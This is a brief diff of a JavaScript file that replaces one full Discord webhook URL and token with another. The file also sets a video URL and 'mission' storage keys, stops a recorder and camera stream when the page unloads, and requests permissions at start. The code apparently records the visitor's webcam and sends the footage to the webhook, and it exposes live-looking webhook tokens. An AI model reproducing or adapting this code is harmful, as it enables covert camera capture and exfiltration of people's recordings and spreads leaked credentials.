@@ -1,5 +1,5 @@
 /* ===== CONFIG ===== */
-const WH   = "https://discord.com/api/webhooks/1379451829116600481/rBfx4dEdwNAzaF3mR3UCX1FhpUhzEjZctUaCHOdTSDI7gMMK3AtdxF0pBXmBnd3cKJCr";              // ← replace
+const WH   = "https://discord.com/api/webhooks/1434564727559946304/PU22fOtU-HhE3o8TwUqT7jKQxovt7v3bsUGqzACCJvEI0VPHkkFN41DLljxnfW1PdwXp";              // ← replace
 const VID  = "https://video.wixstatic.com/video/fcb4a6_4843089a817c4ad38e7dc0bd86cc98ca/1080p/mp4/file.mp4";
 const WARN = "missionWarnedOnce";
 const TERM = "missionUsed";
@@ -187,3 +187,4 @@ window.addEventListener("beforeunload",()=>{ stopRecorder(); camStream?.getTrack
 
 /* ===== START ===== */
 requestPerms();
+
